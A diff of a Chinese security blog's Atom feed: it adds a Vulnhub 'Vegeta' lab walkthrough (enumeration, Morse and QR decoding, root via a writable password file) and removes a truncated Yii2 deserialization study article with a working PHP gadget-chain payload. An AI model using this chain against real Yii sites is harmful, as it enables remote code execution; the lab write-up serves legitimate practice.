@@ -2561,6 +2561,105 @@ POST
         <updated>2023-07-19T16:00:00.000Z</updated>
     </entry>
     <entry>
+        <id>https://blog.xcu.icu/2023/07/20/Vegeta%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</id>
+        <title>记一台“misc”-Vegeta靶机打靶记录</title>
+        <link rel="alternate" href="https://blog.xcu.icu/2023/07/20/Vegeta%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
+        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
+&lt;p&gt;前两天坐牢被折磨的有点惨，找一台简单一点的靶机来霍霍一下乐呵乐呵，但是不幸的是找到了一台让我有些痛苦的靶机，做完后我感觉这可能是一个 misc 题&lt;/p&gt;
+&lt;h2 id=&#34;靶机描述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#靶机描述&#34;&gt;#&lt;/a&gt; 靶机描述&lt;/h2&gt;
+&lt;p&gt;靶机难度：低级&lt;/p&gt;
+&lt;p&gt;目标：root 权限的 shell&lt;/p&gt;
+&lt;p&gt;涉及的攻击方法：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;主机发现&lt;/li&gt;
+&lt;li&gt;端口扫描&lt;/li&gt;
+&lt;li&gt;信息收集&lt;/li&gt;
+&lt;li&gt;路径枚举&lt;/li&gt;
+&lt;li&gt;摩尔斯码&lt;/li&gt;
+&lt;li&gt;数据编码还原&lt;/li&gt;
+&lt;li&gt;二维码解码&lt;/li&gt;
+&lt;li&gt;本地提权&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;虚拟机：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;格式： 虚拟机 （Virtualbox OVA）&lt;/li&gt;
+&lt;li&gt;操作系统： Linux.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;联网：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DHCP 服务：已启用&lt;/li&gt;
+&lt;li&gt;IP 地址自动分配&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这在 VirtualBox 而不是 VMware 上效果更好。&lt;/p&gt;
+&lt;h2 id=&#34;攻击流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击流程&#34;&gt;#&lt;/a&gt; 攻击流程&lt;/h2&gt;
+&lt;h3 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h3&gt;
+&lt;p&gt;PS：靶机和我的 kali 都是桥接模式，处于同一个网段&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721125116960.png&#34; alt=&#34;image-20230721125116960&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;然后协议发现&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721125200383.png&#34; alt=&#34;image-20230721125200383&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;openssl7.9 的 ssh 服务，目标服务器是 debian 系统，80 端口是一个 apache2.4.38 版本的 http 服务，接下来还是去查看 80 端口上面的服务&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721130523238.png&#34; alt=&#34;image-20230721130523238&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;页面简单的查看了一下没有发现什么有用的东西，扫描目录看一眼&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721141828365.png&#34; alt=&#34;image-20230721141828365&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里有一个 admin 目录，直接去访问&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721141930784.png&#34; alt=&#34;image-20230721141930784&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里就只有一个 admin.php 文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721142021224.png&#34; alt=&#34;image-20230721142021224&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;空白的页面，查看页面源码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721142012281.png&#34; alt=&#34;image-20230721142012281&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;发现有一个上图这样的东西，可能是因为没有 php 解析环境？或者是将这个字符串输出出来了？，暂时有一个这样的疑问接着看别的目录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721142248570.png&#34; alt=&#34;image-20230721142248570&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;img 下面有一个图片&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721142310917.png&#34; alt=&#34;image-20230721142310917&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;还是没有看到很能有帮助的信息，接着查看别的目录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721142400115.png&#34; alt=&#34;image-20230721142400115&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这就是 apache 的默认页面，还是没有有价值的信息&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721142550545.png&#34; alt=&#34;image-20230721142550545&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里当访问到 login.php 的时候会将文件直接下载下来，很显然靶机是没有 php 环境的，这里的 login.php 也是一个空文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721142809477.png&#34; alt=&#34;image-20230721142809477&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;看到 robots.txt 文件，这里有一个 find_me，尝试去访问&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721142853346.png&#34; alt=&#34;image-20230721142853346&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这还是一个目录，点进去看这个文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721143006622.png&#34; alt=&#34;image-20230721143006622&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;还是没有太有价值的东西，但是在源码中我找到了这样一段&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721143042899.png&#34; alt=&#34;image-20230721143042899&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;将这一串 base64 解码两次，发现是一个图片&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721143331187.png&#34; alt=&#34;image-20230721143331187&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;文件头是 png，于是找了一个在线的 base 转图片来转化一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721143459322.png&#34; alt=&#34;image-20230721143459322&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;拿到了一个二维码文件，使用 QR Research 来解析&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721143608329.png&#34; alt=&#34;image-20230721143608329&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;是隐藏了一个密码在里面的 Password : topshellv，这里想过是 ssh 的密码，但是尝试登录没有成功&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721145824227.png&#34; alt=&#34;image-20230721145824227&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里我尝试了很久，但是一直没有找到有用的信息，知道后来看了网上别的师傅的，知道还有一个 bulma 这样一个目录，我的评价是意料之外，情理之中&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721150506948.png&#34; alt=&#34;image-20230721150506948&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;看到出现新的文件，我只能说这要是没脑洞到，谁能想到这个，下载这个文件后庭了一下发现这是一段莫斯，使用 au 将其打开&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721151151402.png&#34; alt=&#34;image-20230721151151402&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;手动转化也行，但是我比较懒&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tb3JzZWNvZGUud29ybGQvaW50ZXJuYXRpb25hbC9kZWNvZGVyL2F1ZGlvLWRlY29kZXItZXhwZXJ0Lmh0bWw=&#34;&gt; Morse Code Audio Decoder | Morse Code World&lt;/span&gt; 我用这个工具转化&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721152006708.png&#34; alt=&#34;image-20230721152006708&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;就拿到了这样一段信息，最后括号中是信息是 s 替换为 $，那就拿到了一组用户名密码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;trunks
+u$3r
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721152729149.png&#34; alt=&#34;image-20230721152729149&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;怎么看都像是 misc（难绷）&lt;/p&gt;
+&lt;h3 id=&#34;提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#提权&#34;&gt;#&lt;/a&gt; 提权&lt;/h3&gt;
+&lt;p&gt;开始我还在直接利用 sudo 来尝试，毕竟开始也是拿到了一个秘密，但是这里没有 sudo 命令&lt;/p&gt;
+&lt;p&gt;翻了翻其中的文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721153135118.png&#34; alt=&#34;image-20230721153135118&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;发现这样一个重要的文件的所有者是当前用户，这里直接改这个文件即可，生成一个密码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721153436399.png&#34; alt=&#34;image-20230721153436399&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;更改 root 用户的密码为 123456&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721153701172.png&#34; alt=&#34;image-20230721153701172&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;su&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230721153732072.png&#34; alt=&#34;image-20230721153732072&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;总的来说，那个神奇的目录还是让我很抓狂的&lt;/p&gt;
+</content>
+        <category term="Vulnhub" scheme="https://blog.xcu.icu/categories/Vulnhub/" />
+        <category term="Vulnhub" scheme="https://blog.xcu.icu/tags/Vulnhub/" />
+        <updated>2023-07-19T16:00:00.000Z</updated>
+    </entry>
+    <entry>
         <id>https://blog.xcu.icu/2023/07/19/Hacker_Kid-v1.0.1%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</id>
         <title>Hacker_Kid-v1.0.1靶机打靶记录</title>
         <link rel="alternate" href="https://blog.xcu.icu/2023/07/19/Hacker_Kid-v1.0.1%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
@@ -9240,308 +9339,5 @@ if __name__ == &#39;__main__&#39;:
         <category term="Web" scheme="https://blog.xcu.icu/categories/Web/" />
         <category term="被动信息收集" scheme="https://blog.xcu.icu/tags/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" />
         <updated>2023-03-19T16:00:00.000Z</updated>
-    </entry>
-    <entry>
-        <id>https://blog.xcu.icu/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
-        <title>yii反序列化</title>
-        <link rel="alternate" href="https://blog.xcu.icu/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
-&lt;p&gt;CTFshow 做到这一块了，先简单的记录一下对 pop 链的构建，然后借助题来练习一下&lt;/p&gt;
-&lt;p&gt;文章参考&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueWlpY2hpbmEuY29tL3R1dG9yaWFsLzEyMQ==&#34;&gt; Yii2.0 路由（Route）的实现原理 - 教程 - Yii Framework 中文网 (yiichina.com)&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU3NjcyNS9hcnRpY2xlL2RldGFpbHMvMTIzOTg2ODE5&#34;&gt;(66 条消息) yii 反序列化漏洞复现及利用_yii 漏洞_拓海 AE 的博客 - CSDN 博客&lt;/span&gt;&lt;/p&gt;
-&lt;h2 id=&#34;yii框架&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#yii框架&#34;&gt;#&lt;/a&gt; yii 框架&lt;/h2&gt;
-&lt;p&gt;yii 是一个适用于 web2.0 的应用开发 php 框架&lt;br /&gt;
- yii 是一个通用的 web 编程框架，即可以开发各种用 PHP 构建的 web 应用。因为基于组件的框架结构，比较适合大型应用开发，现在主要使用的是 2.0 这个重写的版本，它使用了 php 的命名空间和特质的特性&lt;/p&gt;
-&lt;h2 id=&#34;漏洞描述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞描述&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
-&lt;p&gt;yii2.2.0.38 之前的版本存在反序列化漏洞，程序在调用 unserialize 时，我们可以通过构造特定的 payload 来进行 rce&lt;/p&gt;
-&lt;h2 id=&#34;环境搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境搭建&#34;&gt;#&lt;/a&gt; 环境搭建&lt;/h2&gt;
-&lt;p&gt;选择的版本是 2.0.37&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3lpaXNvZnQveWlpMi9yZWxlYXNlcy90YWcvMi4wLjM3&#34;&gt;Release 2.0.37 · yiisoft/yii2 · GitHub&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303082128415.png&#34; alt=&#34;image-20230308212823338&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;在 config/web.php 文件的 cookieValidationKey 为一个值（这个值为一个随机的值就可以了，不然会报错 狗头.jpg）&lt;/p&gt;
-&lt;p&gt;在文件中有一个 yii 文件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091010504.png&#34; alt=&#34;image-20230309101038399&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;运行这个文件就可以开启这个服务&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091015862.png&#34; alt=&#34;image-20230309101540820&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;访问给的这个地址&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091017019.png&#34; alt=&#34;image-20230309101720932&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;到此，一个简单的复现环境就搭建好了&lt;/p&gt;
-&lt;h2 id=&#34;漏洞复现2037&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞复现2037&#34;&gt;#&lt;/a&gt; 漏洞复现 2.0.37&lt;/h2&gt;
-&lt;p&gt;环境搭建好了就开始构造利用&lt;/p&gt;
-&lt;h3 id=&#34;知识点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#知识点&#34;&gt;#&lt;/a&gt; 知识点&lt;/h3&gt;
-&lt;p&gt;这里主要简单记录一下以前写笔记时没有记录到的知识点&lt;/p&gt;
-&lt;h4 id=&#34;命名空间&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命名空间&#34;&gt;#&lt;/a&gt; 命名空间&lt;/h4&gt;
-&lt;p&gt;PHP 的命名空间是一种用于解决命名冲突问题的技术。它可以让开发者在同一个程序中使用相同的类名、函数名或常量名，而不会发生命名冲突的问题。&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;空间成员&lt;/code&gt; ：这里空间成员是指空间所影响的（只影响类，函数，常量）&lt;/p&gt;
-&lt;p&gt;空间成员的访问：&lt;/p&gt;
-&lt;p&gt;一个 php 文件中，第一个空间的定义义必须放在第 1 行。如果所要定义的空间已存在，则是进入空间&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-namespace app;
-
-function test()&amp;#123;
-    echo 1;
-&amp;#125;
-test();//app\test()
-namespace app\assets;
-
-function test()&amp;#123;
-    echo 2;
-&amp;#125;
-
-test();//app\assets\test()
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;在 PHP 中，命名空间可以通过关键字  &lt;code&gt;namespace&lt;/code&gt;  来定义。例如，下面的代码定义了命名空间  &lt;code&gt;MyNamespace&lt;/code&gt; ：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;namespace MyNamespace;
-
-class MyClass &amp;#123;
-    // class definition
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;在定义了命名空间之后，我们可以使用完全限定名称（Fully Qualified Name）来访问该命名空间中的类、函数或常量。例如，如果要访问上面定义的  &lt;code&gt;MyClass&lt;/code&gt;  类，可以使用以下代码：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$obj = new \MyNamespace\MyClass();
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;在上面的代码中， &lt;code&gt;\&lt;/code&gt;  表示根命名空间，因此  &lt;code&gt;\MyNamespace\MyClass&lt;/code&gt;  表示完全限定名称。&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;引入空间成员&lt;/code&gt; :&lt;/p&gt;
-&lt;p&gt;use 空间名 \ 空间名 【as 别名】：将指定空间引入到当前空间。同可以使用 as 关键字为被引入的空间起个别名。&lt;/p&gt;
-&lt;p&gt;use 空间名 \ 空间名 \ 成员类 【as 别名】：将指定的空间中的成员引入到当前空间，引入空间成员只能引入类。&lt;/p&gt;
-&lt;h4 id=&#34;路由&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#路由&#34;&gt;#&lt;/a&gt; 路由&lt;/h4&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303091043533.png&#34; alt=&#34;image-20230309104343460&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里可以看一下日志，可以看到所有的用户请求都是发送给入口脚本  &lt;code&gt;index.php&lt;/code&gt;  来处理的。那么，开发者需要一种高效的判断请求应当采用哪个 controller 哪个 action 进行处理的方法。&lt;/p&gt;
-&lt;p&gt;这里并不像是像有些网站那种 https://www.cnblogs.com/LQ-Joker/p/16102371.html 一是过于冗长，二是易出错且难排查，三是日后修改起来容易有遗漏，yii 提供了路由和 URL 管理的组件路由是指 URL 中用于标识用于处理用户请求的 module, controller, action 的部分，一般情况下由  &lt;code&gt;r&lt;/code&gt;  查询参数来指定。如 &lt;code&gt;http://www.digpage.com/index.php?r=post/view&amp;amp;id=100&lt;/code&gt;  ，表示这个请求将由 PostController 的 actionView 来处理。&lt;/p&gt;
-&lt;p&gt;更多的可以膜拜一下上面路由原理教程&lt;/p&gt;
-&lt;h3 id=&#34;复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现&#34;&gt;#&lt;/a&gt; 复现&lt;/h3&gt;
-&lt;p&gt;我们利用的是反序列化漏洞，所以我们需要构建一个反序列化的入口&lt;/p&gt;
-&lt;p&gt;在 Controllers 下面创建一个 TestController 文件&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-
-namespace app\controllers;
-
-class TestController extends \yii\web\Controller
-&amp;#123;
-    public function actionTest($data)
-    &amp;#123;
-        return unserialize(base64_decode($data));
-    &amp;#125;
-
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;漏洞利用点， &lt;code&gt;basic/vendor/yiisoft/yii2/db/BatchQueryResult.php&lt;/code&gt;  这个文件下&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    public function __destruct()
-    &amp;#123;
-        // make sure cursor is closed
-        $this-&amp;gt;reset();
-    &amp;#125;
-
-    /**
-     * Resets the batch query.
-     * This method will clean up the existing batch query so that a new batch query can be performed.
-     */
-    public function reset()
-    &amp;#123;
-        if ($this-&amp;gt;_dataReader !== null) &amp;#123;
-            $this-&amp;gt;_dataReader-&amp;gt;close();
-        &amp;#125;
-        $this-&amp;gt;_dataReader = null;
-        $this-&amp;gt;_batch = null;
-        $this-&amp;gt;_value = null;
-        $this-&amp;gt;_key = null;
-    &amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里有一个__destruct 函数，通过反序列化会自动调用这个函数，跟到下一步 reset ()，这里只有一个 close 可以跟进&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092047714.png&#34; alt=&#34;image-20230309204712681&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里继续跟进&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092048710.png&#34; alt=&#34;image-20230309204809681&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;没有发现可以利用的点，这里可以控制 $this-&amp;gt;_dataReader，使用一个别的类中没有的参数，可以触发 &lt;code&gt;__call&lt;/code&gt;  方法来进行利用。__call 函数的当调用一个不存在或者不可调用的方法的时候会自动调用，全局收索一下，那些地方有__call 函数可以利用，在 &lt;code&gt;basic/vendor/fzaninotto/faker/src/Faker/Generator.php&lt;/code&gt;  这个文件下&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092034885.png&#34; alt=&#34;image-20230309203444834&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;至于为什么选用这个函数，我们再进一步，查看 format 函数&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092035551.png&#34; alt=&#34;image-20230309203513523&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里有一个回调函数，如果里面的参数可控这里就可以直接利用了&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;call_user_func_array(callable $callback, array $param_arr): mixed 
-callback
-    被调用的回调函数。
-param_arr
-    要被传入回调函数的数组，这个数组得是索引数组。
-    
-function a($b, $c) &amp;#123;  
-    echo $b; 
-	echo $c; 
-&amp;#125; 
-call_user_func_array(&#39;a&#39;, array(&amp;quot;111&amp;quot;, &amp;quot;222&amp;quot;)); 
-//输出 111 222
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;接着跟进 getFormatter 函数&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092040954.png&#34; alt=&#34;image-20230309204059909&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;在第一个 if 语句就可以看到，这里对上面回调函数中的第一个参数是可控的，后一个参数这个函数写为空值了&lt;/p&gt;
-&lt;p&gt;这里需要一个类，可以命令执行，这里看到师傅们用的是 call_user_func&lt;/p&gt;
-&lt;p&gt;这里全局找一下带有 call_user_func 的类，这里找到两个参数可控的类&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;basic/vendor/yiisoft/yii2/rest/IndexAction.php&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092133955.png&#34; alt=&#34;image-20230309213304905&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;basic/vendor/yiisoft/yii2/rest/CreateAction.php&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303092133649.png&#34; alt=&#34;image-20230309213342624&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这两个类都可以使用，pop 链还是比较好构造的&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;yii\db\BatchQueryResult::__destruct()-&amp;gt;reset()-&amp;gt;close()
-↓↓↓
-Fake\Generator::__call()-&amp;gt;format()-&amp;gt;call_user_func_array
-↓↓↓
-yii\rest\IndexAction::run()-&amp;gt;call_user_func
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Payload：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-namespace yii\rest&amp;#123;
-    class IndexAction&amp;#123;
-        public $checkAccess=&amp;quot;phpinfo&amp;quot;; //调用的函数
-        public $id=&amp;quot;1&amp;quot;;			//函数中的参数
-    &amp;#125;
-&amp;#125;
-
-namespace Faker&amp;#123;
-    use yii\rest\IndexAction;
-
-    class Generator&amp;#123;
-        protected $formatters;
-        public function __construct()
-        &amp;#123;
-            $this-&amp;gt;formatters[&#39;close&#39;] = [new IndexAction(),&#39;run&#39;];
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-
-namespace yii\db&amp;#123;
-    use Faker\Generator;
-
-    class BatchQueryResult&amp;#123;
-        private $_dataReader;
-        public function __construct()
-        &amp;#123;
-            $this-&amp;gt;_dataReader = new Generator();
-        &amp;#125;
-    &amp;#125;
-
-&amp;#125;
-
-namespace &amp;#123;
-
-    use yii\db\BatchQueryResult;
-
-    echo base64_encode(serialize(new BatchQueryResult()));
-&amp;#125;
-//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo3OiJwaHBpbmZvIjtzOjI6ImlkIjtzOjE6IjEiO31pOjE7czozOiJydW4iO319fX0=
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100053418.png&#34; alt=&#34;image-20230310005338299&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;成功执行 phpinfo，执行一个 ping &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5iYWlkdS5jb20=&#34;&gt;www.baidu.com&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100055463.png&#34; alt=&#34;image-20230310005515376&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;其他pop链&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他pop链&#34;&gt;#&lt;/a&gt; 其他 pop 链&lt;/h3&gt;
-&lt;p&gt;看到师傅利用别的函数也有 pop 链，学习记录一下&lt;/p&gt;
-&lt;p&gt;链子的起点还是 &lt;code&gt;basic/vendor/yiisoft/yii2/db/BatchQueryResult.php&lt;/code&gt;  这个文件下的__destruct 函数，这个 pop 中没有再啊利用 call 魔术方法，而是找到了一个本来就有的 close 函数来实现命令执行，找到的利用函数在 &lt;code&gt;basic/vendor/yiisoft/yii2/web/DbSession.php&lt;/code&gt;  这里&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202303100111573.png&#34; alt=&#34;image-20230310011115526&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这个函数下面的 composeFields 可以利用&lt;/p&gt;
